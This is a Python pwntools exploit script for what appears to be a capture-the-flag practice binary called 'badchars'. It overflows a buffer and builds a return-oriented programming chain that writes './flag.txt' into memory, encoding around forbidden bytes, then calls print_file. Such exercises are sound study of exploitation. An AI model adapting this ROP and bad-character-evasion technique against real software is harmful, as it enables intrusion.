#!/usr/bin/python3

from pwn import *
# pop r12; pop r13; pop r14; pop r15; ret; 
pop_gaget 	= p64(0x40069c)
pop_15 	= p64(0x4006a2)

# Move [r13] r12
write_gaget 	= p64(0x400634)
pop_rdi 	= p64(0x4006a3)
write_loc 	= 0x601028 + 3
print_file 	= p64(0x400620)
back_junk 	= b"B" * 20
# sub    BYTE PTR [r15],r14b
sub_gaget = p64(0x0000000000400630)

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2

badChars = b"xga."

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
            # print(binascii.hexlify(payload[i:i+8]))

def string_place(write_string, write_start):
	returnPayload = b""
	toModify = []

	for i in range(0, len(write_string), 8):
		returnPayload += pop_gaget
                # r12 Value
		temp = write_string[i:i+8]
		# pad in the values so it always fills in all 8 bytes
		temp += b"\x00" * ( 8 - len(temp) )

		x = b""
		for j in range(len(temp)):
			
			#the while loop will keep modifing the value untill it is a good char
			if temp[j] in badChars:
					x += (int(temp[j]) + 1).to_bytes(1, 'big')

					# this should be the exact memory address of the bad character
					toModify.append(write_start + i + j)
			else:
				x += temp[j].to_bytes(1, 'big')
		temp = x
		returnPayload += temp
		#destination r13
		returnPayload += p64( write_start+ (i))
		# This is the r14 value
		returnPayload += p64(0x01)
		# This is the r15 value
		returnPayload += p64(0xdeadbeefcafebabe)
		returnPayload += write_gaget
	for i in toModify:
		temp = b""
		temp += pop_15
		
		# This is the r15 value the lopcation to store and subtract from 
		temp += p64(i)
		temp += sub_gaget
		returnPayload += temp
	return returnPayload

"""
Place the value for the first args of a function
"""
def first_arg(var):
	returnPayload = pop_rdi
	returnPayload += p64(var)
	return returnPayload



io = process('./badchars')

#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += string_place(b"./flag.txt", write_loc)

# This is the vaddr of system
# First return to the location of the pop rdi
payload += first_arg(write_loc)
payload += print_file

payload += back_junk


# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))

for i in range(len(payload)):
	if payload[i] in badChars:
		print("Warning bad char detected")
		exit()

input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))
sleep(1)
f = open('./payload', 'wb')
f.write(payload)
f.close()
